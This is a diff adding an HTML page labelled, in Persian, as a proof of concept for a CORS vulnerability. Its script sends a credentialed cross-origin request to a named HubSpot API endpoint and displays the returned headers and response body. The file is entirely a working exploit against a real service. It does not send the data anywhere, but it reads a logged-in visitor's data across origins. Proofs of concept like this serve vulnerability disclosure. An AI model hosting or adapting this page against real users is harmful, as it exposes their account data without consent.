@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS PoC</title>
+</head>
+<body>
+    <h1>✅ اثبات آسیب‌پذیری CORS</h1>
+    <button onclick="getData()" style="padding:10px 20px;font-size:16px;">کلیک کن تا داده‌ها رو ببینی</button>
+    <pre id="result" style="background:#f4f4f4;padding:15px;margin-top:20px;border-radius:5px;"></pre>
+
+    <script>
+    function getData() {
+        const url = "https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth";
+        
+        fetch(url, {
+            method: "GET",
+            credentials: "include"
+        })
+        .then(response => {
+            const originHeader = response.headers.get('access-control-allow-origin');
+            const credHeader = response.headers.get('access-control-allow-credentials');
+            
+            document.getElementById('result').innerHTML = 
+                '✅ درخواست ارسال شد!\n\n' +
+                '📌 Access-Control-Allow-Origin: ' + originHeader + '\n' +
+                '📌 Access-Control-Allow-Credentials: ' + credHeader + '\n\n' +
+                '📦 داده‌های برگشتی از سرور:\n' +
+                '----------------------------------------\n';
+            
+            return response.text();
+        })
+        .then(data => {
+            document.getElementById('result').innerHTML += data;
+        })
+        .catch(err => {
+            document.getElementById('result').innerHTML = '❌ خطا: ' + err;
+        });
+    }
+    </script>
+</body>
+</html>
